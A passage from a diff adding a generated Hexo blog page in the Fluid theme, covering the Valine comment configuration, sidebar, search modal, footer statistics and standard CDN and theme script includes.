+          {"appId":"TKccC2BvrQ0jKroA5aUdv8tr-gzGzoHsz","appKey":"rSHs3EnI9lT7nQwv5J7fcBnq","path":"window.location.pathname","placeholder":null,"avatar":"retro","meta":["nick","mail","link"],"requiredFields":[],"pageSize":10,"lang":"zh-CN","highlight":false,"recordIP":false,"serverURLs":"","emojiCDN":null,"emojiMaps":null,"enableQQ":false},
+          {
+            el: "#valine",
+            path: window.location.pathname
+          }
+        )
+        new Valine(options);
+        Fluid.utils.waitElementVisible('#valine .vcontent', () => {
+          var imgSelector = '#valine .vcontent img:not(.vemoji)';
+          Fluid.plugins.imageCaption(imgSelector);
+          Fluid.plugins.fancyBox(imgSelector);
+        })
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a>
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
